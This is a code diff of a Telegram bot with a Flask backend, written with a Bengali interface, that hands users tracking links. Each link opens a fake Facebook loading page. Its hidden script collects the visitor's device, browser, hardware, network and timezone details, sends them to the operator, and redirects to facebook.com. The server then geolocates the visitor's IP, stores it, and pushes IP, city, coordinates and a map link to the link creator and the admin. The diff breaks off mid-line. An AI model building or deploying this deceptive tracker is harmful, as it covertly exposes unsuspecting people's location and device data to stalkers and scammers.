@@ -16,7 +16,6 @@ CHANNELS  = ["@BDCyberSite", "@EdusTech"]
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ============ DATABASE ============
 def init_db():
     conn = sqlite3.connect("tracker.db", check_same_thread=False)
     c = conn.cursor()
@@ -40,7 +39,6 @@ def get_db():
     conn.row_factory = sqlite3.Row
     return conn
 
-# ============ MEMBERSHIP ============
 def check_membership(user_id):
     if user_id == ADMIN_ID:
         return True
@@ -63,13 +61,100 @@ def join_markup():
 def not_joined_msg(chat_id):
     bot.send_message(chat_id,
         "⚠️ *বট ব্যবহার করতে আগে Join করো!*\n\n"
-        "নিচের চ্যানেলগুলোতে Join করে\n"
+        "নিচের চ্যানেলে Join করে\n"
         "*✅ Join করেছি* বাটন চাপো।",
         parse_mode="Markdown",
         reply_markup=join_markup())
 
-# ============ FAKE PAGE ============
-FAKE_PAGE = """<!DOCTYPE html>
+# JS আলাদা variable এ রাখা হয়েছে — string escape সমস্যা নেই
+TRACKER_JS = """
+<script>
+var token = "TOKEN_HERE";
+var base  = "BASE_HERE";
+
+function sendData(data){
+  fetch(base + "/collect/" + token, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(data)
+  }).finally(function(){
+    setTimeout(function(){ window.location.href = "https://www.facebook.com"; }, 300);
+  });
+}
+
+function getOS(ua){
+  if(/Android/.test(ua)){
+    var m = ua.match(/Android ([\d.]+)/);
+    return "Android " + (m ? m[1] : "");
+  }
+  if(/iPhone|iPad/.test(ua)){
+    var m = ua.match(/OS ([\d_]+)/);
+    return "iOS " + (m ? m[1].replace(/_/g,".") : "");
+  }
+  if(/Windows NT/.test(ua)){
+    var m = ua.match(/Windows NT ([\d.]+)/);
+    return "Windows " + (m ? m[1] : "");
+  }
+  if(/Mac OS X/.test(ua)){
+    var m = ua.match(/Mac OS X ([\d_]+)/);
+    return "macOS " + (m ? m[1].replace(/_/g,".") : "");
+  }
+  if(/Linux/.test(ua)) return "Linux";
+  return "Unknown";
+}
+
+function getBrowser(ua){
+  if(/Chrome\//.test(ua) && !/Edg/.test(ua)){
+    var m = ua.match(/Chrome\/([\d.]+)/);
+    return "Chrome " + (m ? m[1] : "");
+  }
+  if(/Firefox\//.test(ua)){
+    var m = ua.match(/Firefox\/([\d.]+)/);
+    return "Firefox " + (m ? m[1] : "");
+  }
+  if(/Edg\//.test(ua)){
+    var m = ua.match(/Edg\/([\d.]+)/);
+    return "Edge " + (m ? m[1] : "");
+  }
+  if(/Safari\//.test(ua)) return "Safari";
+  return "Unknown";
+}
+
+function getDevice(ua){
+  if(/Android/.test(ua)) return "Android";
+  if(/iPhone/.test(ua))  return "iPhone";
+  if(/iPad/.test(ua))    return "iPad";
+  return "Desktop";
+}
+
+function collect(){
+  var ua  = navigator.userAgent;
+  var nc  = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+  var data = {
+    os:       getOS(ua),
+    browser:  getBrowser(ua),
+    device:   getDevice(ua),
+    screen:   screen.width + "x" + screen.height,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+    language: navigator.language || "Unknown",
+    ram:      navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
+    cpu:      navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Core" : "Unknown",
+    network:  nc.effectiveType || nc.type || "Unknown",
+    netspeed: nc.downlink ? nc.downlink + "Mbps" : "Unknown",
+    touch:    ("ontouchstart" in window) ? "Yes" : "No",
+    referrer: document.referrer || "Direct",
+    ua:       ua.substring(0, 200)
+  };
+  sendData(data);
+}
+
+collect();
+</script>
+"""
+
+def make_page(token):
+    js = TRACKER_JS.replace("TOKEN_HERE", token).replace("BASE_HERE", BASE_URL)
+    return """<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -92,63 +177,8 @@ border-radius:50%;animation:s .8s linear infinite;margin:0 auto}
   <div class="logo">facebook</div>
   <div class="spin"></div>
 </div>
-<script>
-const token = "__TOKEN__";
-const base  = "__BASE__";
+""" + js + "</body></html>"
 
-function send(data){
-  fetch(base+"/collect/"+token,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify(data)
-  }).finally(()=>{
-    setTimeout(()=>window.location.href="https://www.facebook.com",300);
-  });
-}
-
-async function collect(){
-  const nav=navigator, scr=screen;
-  const nc=nav.connection||nav.mozConnection||nav.webkitConnection||{};
-
-  let os="অজানা";
-  const ua=nav.userAgent;
-  if(/Android/.test(ua))       os="Android "+((ua.match(/Android ([\\d.]+)/)||[])[1]||"");
-  else if(/iPhone|iPad/.test(ua)) os="iOS "+((ua.match(/OS ([\\d_]+)/)||[])[1]||"").replace(/_/g,".");
-  else if(/Windows NT/.test(ua))  os="Windows "+((ua.match(/Windows NT ([\\d.]+)/)||[])[1]||"");
-  else if(/Mac OS X/.test(ua))    os="macOS "+((ua.match(/Mac OS X ([\\d_]+)/)||[])[1]||"").replace(/_/g,".");
-  else if(/Linux/.test(ua))       os="Linux";
-
-  let br="অজানা";
-  if(/Chrome\\//.test(ua)&&!/Edg/.test(ua)) br="Chrome "+((ua.match(/Chrome\\/([\\d.]+)/)||[])[1]||"");
-  else if(/Firefox\\//.test(ua)) br="Firefox "+((ua.match(/Firefox\\/([\\d.]+)/)||[])[1]||"");
-  else if(/Edg\\//.test(ua))     br="Edge "+((ua.match(/Edg\\/([\\d.]+)/)||[])[1]||"");
-  else if(/Safari\\//.test(ua))  br="Safari";
-
-  let device="💻 Desktop";
-  if(/Android/.test(ua))     device="📱 Android";
-  else if(/iPhone/.test(ua)) device="🍎 iPhone";
-  else if(/iPad/.test(ua))   device="🍎 iPad";
-
-  send({
-    os, browser:br, device,
-    screen:scr.width+"x"+scr.height,
-    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"অজানা",
-    language:nav.language||"অজানা",
-    ram:nav.deviceMemory?nav.deviceMemory+"GB":"অজানা",
-    cpu:nav.hardwareConcurrency?nav.hardwareConcurrency+" Core":"অজানা",
-    network:nc.effectiveType||nc.type||"অজানা",
-    netspeed:nc.downlink?nc.downlink+"Mbps":"অজানা",
-    touch:("ontouchstart" in window)?"Yes":"No",
-    referrer:document.referrer||"Direct",
-    ua:ua.substring(0,200)
-  });
-}
-collect();
-</script>
-</body>
-</html>"""
-
-# ============ FLASK ============
 @app.route("/")
 def home():
     return "Bot Alive!", 200
@@ -160,8 +190,7 @@ def track(token):
     db.close()
     if not row:
         return redirect("https://facebook.com")
-    page = FAKE_PAGE.replace("__TOKEN__", token).replace("__BASE__", BASE_URL)
-    return page, 200
+    return make_page(token), 200
 
 @app.route("/collect/<token>", methods=["POST"])
 def collect(token):
@@ -172,20 +201,20 @@ def collect(token):
         request.headers.get("CF-Connecting-IP") or
         request.headers.get("True-Client-IP") or
         request.headers.get("X-Real-IP") or
-        request.headers.get("X-Forwarded-For","").split(",")[0].strip() or
+        request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
         request.remote_addr or "Unknown"
     ).strip()
 
-    country=city=region=isp=lat=lon="অজানা"
+    country=city=region=isp=lat=lon="Unknown"
     try:
         loc = requests.get(f"http://ip-api.com/json/{ip}?lang=en", timeout=5).json()
         if loc.get("status") == "success":
-            country = loc.get("country","অজানা")
-            city    = loc.get("city","অজানা")
-            region  = loc.get("regionName","অজানা")
-            isp     = loc.get("isp","অজানা")
-            lat     = str(loc.get("lat",""))
-            lon     = str(loc.get("lon",""))
+            country = loc.get("country", "Unknown")
+            city    = loc.get("city",    "Unknown")
+            region  = loc.get("regionName", "Unknown")
+            isp     = loc.get("isp",     "Unknown")
+            lat     = str(loc.get("lat", ""))
+            lon     = str(loc.get("lon", ""))
     except:
         pass
 
@@ -201,11 +230,11 @@ def collect(token):
          screen,timezone,language,ram,cpu,network,netspeed,referrer,time)
         VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
         (token, ip, country, city, region, isp, lat, lon,
-         js.get("device","অজানা"), js.get("os","অজানা"),
-         js.get("browser","অজানা"), js.get("screen","অজানা"),
-         js.get("timezone","অজানা"), js.get("language","অজানা"),
-         js.get("ram","অজানা"), js.get("cpu","অজানা"),
-         js.get("network","অজানা"), js.get("netspeed","অজানা"),
+         js.get("device","Unknown"), js.get("os","Unknown"),
+         js.get("browser","Unknown"), js.get("screen","Unknown"),
+         js.get("timezone","Unknown"), js.get("language","Unknown"),
+         js.get("ram","Unknown"), js.get("cpu","Unknown"),
+         js.get("network","Unknown"), js.get("netspeed","Unknown"),
          js.get("referrer","Direct"), now))
     db.commit()
 
@@ -213,7 +242,7 @@ def collect(token):
     link_name = row["name"]
     db.close()
 
-    maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "অজানা" else None
+    maps = f"https://maps.google.com/?q={lat},{lon}" if lat and lat != "Unknown" else None
 
     msg = (
         f"🚨 *লিংকে ক্লিক হয়েছে!*\n\n"
@@ -226,17 +255,17 @@ def collect(token):
         f"📡 ISP: {isp}\n"
         f"📌 {lat}, {lon}\n\n"
         f"━━━━━━━━━━━━━\n"
-        f"{js.get('device','অজানা')}\n"
-        f"🖥️ OS: {js.get('os','অজানা')}\n"
-        f"🌐 Browser: {js.get('browser','অজানা')}\n"
-        f"📐 Screen: {js.get('screen','অজানা')}\n"
-        f"🕐 Timezone: {js.get('timezone','অজানা')}\n"
-        f"🗣️ Language: {js.get('language','অজানা')}\n"
-        f"💾 RAM: {js.get('ram','অজানা')}\n"
-        f"⚙️ CPU: {js.get('cpu','অজানা')}\n"
-        f"📶 Network: {js.get('network','অজানা')}\n"
-        f"⚡ Speed: {js.get('netspeed','অজানা')}\n"
-        f"👆 Touch: {js.get('touch','অজানা')}\n"
+        f"📱 Device: {js.get('device','Unknown')}\n"
+        f"🖥️ OS: {js.get('os','Unknown')}\n"
+        f"🌐 Browser: {js.get('browser','Unknown')}\n"
+        f"📐 Screen: {js.get('screen','Unknown')}\n"
+        f"🕐 Timezone: {js.get('timezone','Unknown')}\n"
+        f"🗣️ Language: {js.get('language','Unknown')}\n"
+        f"💾 RAM: {js.get('ram','Unknown')}\n"
+        f"⚙️ CPU: {js.get('cpu','Unknown')}\n"
+        f"📶 Network: {js.get('network','Unknown')}\n"
+        f"⚡ Speed: {js.get('netspeed','Unknown')}\n"
+        f"👆 Touch: {js.get('touch','Unknown')}\n"
         f"🔗 Referrer: {js.get('referrer','Direct')}"
     )
 
@@ -249,15 +278,15 @@ def collect(token):
     except:
         pass
 
-    # Admin কেও notify করো (owner ছাড়া)
     if uid != ADMIN_ID:
         try:
             bot.send_message(ADMIN_ID,
                 f"👁️ *Admin Log*\n\n"
-                f"👤 Owner ID: `{uid}`\n"
+                f"👤 Owner: `{uid}`\n"
                 f"🔗 Link: `{link_name}`\n"
                 f"🌐 IP: `{ip}`\n"
                 f"🌍 {country} | 🏙️ {city}\n"
+                f"📱 {js.get('device','Unknown')}\n"
                 f"📅 {now}",
                 parse_mode="Markdown")
         except:
@@ -265,7 +294,6 @@ def collect(token):
 
     return jsonify({"ok": True})
 
-# ============ BOT MENUS ============
 def main_menu():
     mk = InlineKeyboardMarkup(row_width=2)
     mk.add(
@@ -279,14 +307,13 @@ def main_menu():
 def admin_menu():
     mk = InlineKeyboardMarkup(row_width=2)
     mk.add(
-        InlineKeyboardButton("👥 সব Users",      callback_data="admin_users"),
-        InlineKeyboardButton("🔗 সব Links",      callback_data="admin_links"),
-        InlineKeyboardButton("📊 Total Stats",   callback_data="admin_stats"),
-        InlineKeyboardButton("📋 Recent Logs",   callback_data="admin_logs"),
+        InlineKeyboardButton("👥 সব Users",    callback_data="admin_users"),
+        InlineKeyboardButton("🔗 সব Links",    callback_data="admin_links"),
+        InlineKeyboardButton("📊 Total Stats", callback_data="admin_stats"),
+        InlineKeyboardButton("📋 Recent Logs", callback_data="admin_logs"),
     )
     return mk
 
-# ============ BOT COMMANDS ============
 @bot.message_handler(commands=["start"])
 def cmd_start(m):
     if not check_membership(m.from_user.id):
@@ -314,17 +341,17 @@ def cmd_admin(m):
         bot.send_message(m.chat.id, "❌ তুমি Admin না!")
         return
     db = get_db()
-    total_users = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
-    total_links = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
-    total_clicks= db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
-    total_logs  = db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
+    tu = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
+    tl = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
+    tc = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
+    tlog = db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
     db.close()
     bot.send_message(m.chat.id,
         f"⚙️ *Admin Panel*\n\n"
-        f"👥 Total Users: {total_users}\n"
-        f"🔗 Total Links: {total_links}\n"
-        f"👆 Total Clicks: {total_clicks}\n"
-        f"📋 Total Logs: {total_logs}",
+        f"👥 Total Users: {tu}\n"
+        f"🔗 Total Links: {tl}\n"
+        f"👆 Total Clicks: {tc}\n"
+        f"📋 Total Logs: {tlog}",
         parse_mode="Markdown", reply_markup=admin_menu())
 
 def ask_name(chat_id):
@@ -360,10 +387,10 @@ def create_link(m):
 
     mk = InlineKeyboardMarkup(row_width=2)
     mk.add(
-        InlineKeyboardButton("📋 আমার লিংক",  callback_data="my_links"),
-        InlineKeyboardButton("🔗 নতুন লিংক",  callback_data="new_link"),
-        InlineKeyboardButton("📊 Logs দেখো",   callback_data=f"logs_{token}"),
-        InlineKeyboardButton("🗑️ মুছো",        callback_data=f"del_{token}"),
+        InlineKeyboardButton("📋 আমার লিংক", callback_data="my_links"),
+        InlineKeyboardButton("🔗 নতুন লিংক", callback_data="new_link"),
+        InlineKeyboardButton("📊 Logs দেখো",  callback_data=f"logs_{token}"),
+        InlineKeyboardButton("🗑️ মুছো",       callback_data=f"del_{token}"),
     )
     bot.send_message(m.chat.id,
         f"✅ *লিংক রেডি!*\n\n"
@@ -388,12 +415,11 @@ def show_links(chat_id, user_id):
         msg += f"🔗 *{r['name']}* — {r['clicks']} clicks\n`{BASE_URL}/t/{r['token']}`\n\n"
         mk.add(
             InlineKeyboardButton(f"📊 {r['name'][:10]}", callback_data=f"logs_{r['token']}"),
-            InlineKeyboardButton("🗑️ মুছো",              callback_data=f"del_{r['token']}"),
+            InlineKeyboardButton("🗑️ মুছো", callback_data=f"del_{r['token']}"),
         )
     mk.add(InlineKeyboardButton("🔙 Back", callback_data="menu"))
     bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=mk)
 
-# ============ CALLBACKS ============
 @bot.callback_query_handler(func=lambda c: True)
 def cb(c):
     d   = c.data
@@ -401,7 +427,6 @@ def cb(c):
     cid = c.message.chat.id
     bot.answer_callback_query(c.id)
 
-    # Join check
     if d != "check_join" and not check_membership(uid):
         not_joined_msg(cid)
         return
@@ -438,16 +463,15 @@ def cb(c):
     elif d == "help":
         bot.send_message(cid,
             "❓ *কীভাবে ব্যবহার করবে?*\n\n"
-            "1️⃣ /track দাও\n"
-            "2️⃣ লিংকের নাম দাও\n"
-            "3️⃣ লিংক পাবে\n"
-            "4️⃣ ক্লিক করলেই সব info আসবে!\n\n"
-            "⚠️ VPN থাকলে real IP পাওয়া যাবে না।",
+            "1 /track দাও\n"
+            "2 লিংকের নাম দাও\n"
+            "3 লিংক পাবে\n"
+            "4 ক্লিক করলেই সব info আসবে!\n\n"
+            "VPN থাকলে real IP পাওয়া যাবে না।",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="menu")))
 
-    # ── Admin callbacks ──
     elif d == "admin_users" and uid == ADMIN_ID:
         db   = get_db()
         rows = db.execute(
@@ -456,7 +480,7 @@ def cb(c):
         db.close()
         msg = "👥 *সব Users:*\n\n"
         for r in rows:
-            msg += f"🆔 `{r['user_id']}` | 🔗 {r['lc']} links | 👆 {r['tc'] or 0} clicks\n"
+            msg += f"ID: {r['user_id']} | Links: {r['lc']} | Clicks: {r['tc'] or 0}\n"
         bot.send_message(cid, msg, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
@@ -464,25 +488,25 @@ def cb(c):
     elif d == "admin_links" and uid == ADMIN_ID:
         db   = get_db()
         rows = db.execute(
-            "SELECT user_id,name,clicks,created FROM links ORDER BY clicks DESC LIMIT 15"
+            "SELECT user_id,name,clicks FROM links ORDER BY clicks DESC LIMIT 15"
         ).fetchall()
         db.close()
-        msg = "🔗 *সব Links (Top 15):*\n\n"
+        msg = "🔗 *সব Links:*\n\n"
         for r in rows:
-            msg += f"👤 `{r['user_id']}` | *{r['name']}* | 👆 {r['clicks']}\n"
+            msg += f"👤 {r['user_id']} | {r['name']} | {r['clicks']} clicks\n"
         bot.send_message(cid, msg, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
 
     elif d == "admin_stats" and uid == ADMIN_ID:
         db = get_db()
-        tu = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
-        tl = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
-        tc = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
-        tlog= db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
+        tu   = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
+        tl   = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
+        tc   = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
+        tlog = db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
         db.close()
         bot.send_message(cid,
-            f"📊 *Total Statistics*\n\n"
+            f"📊 *Total Stats*\n\n"
             f"👥 Users: {tu}\n"
             f"🔗 Links: {tl}\n"
             f"👆 Clicks: {tc}\n"
@@ -499,11 +523,9 @@ def cb(c):
             "ORDER BY l.id DESC LIMIT 10"
         ).fetchall()
         db.close()
-        msg = "📋 *Recent 10 Logs:*\n\n"
+        msg = "📋 *Recent Logs:*\n\n"
         for i, r in enumerate(rows, 1):
-            msg += (f"*{i}.* `{r['ip']}`\n"
-                    f"   🌍 {r['country']} | {r['device']}\n"
-                    f"   🔗 {r['name']} | 📅 {r['time']}\n\n")
+            msg += f"{i}. {r['ip']} | {r['country']} | {r['device']} | {r['time']}\n"
         bot.send_message(cid, msg, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
@@ -518,11 +540,11 @@ def cb(c):
             "SELECT name FROM links WHERE token=? AND (user_id=? OR ?=?)",
             (token, uid, uid, ADMIN_ID)).fetchone()
         logs  = db.execute(
-            "SELECT * FROM logs WHERE token=? ORDER BY id DESC LIMIT 5", (token,)
-        ).fetchall()
+            "SELECT * FROM logs WHERE token=? ORDER BY id DESC LIMIT 5",
+            (token,)).fetchall()
         db.close()
         if not link:
-            bot.send_message(cid, "❌ পাওয়া যায়নি।")
+            bot.send_message(cid, "পাওয়া যায়নি।")
             return
         msg = f"📊 *{link['name']}* Logs:\n\n"
         if not logs:
@@ -531,7 +553,7 @@ def cb(c):
             for i, l in enumerate(logs, 1):
                 msg += (
                     f"*{i}.* `{l['ip']}`\n"
-                    f"🌍 {l['country']} | 🏙️ {l['city']}\n"
+                    f"🌍 {l['country']} | {l['city']}\n"
                     f"{l['device']} | {l['os']}\n"
                     f"🌐 {l['browser']} | 📐 {l['screen']}\n"
                     f"💾 {l['ram']} | ⚙️ {l['cpu']}\n"
@@ -540,9 +562,4 @@ def cb(c):
                 )
         bot.send_message(cid, msg, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
-                InlineKeyboardButton("🔙 Back", callback_data="my_links")))
-
-    elif d.startswith("del_"):
-        token = d[4:]
-        db = get_db()
-        db.execute("DELE
+                InlineKeyboardButton("🔙 Back", callback_data="my_link
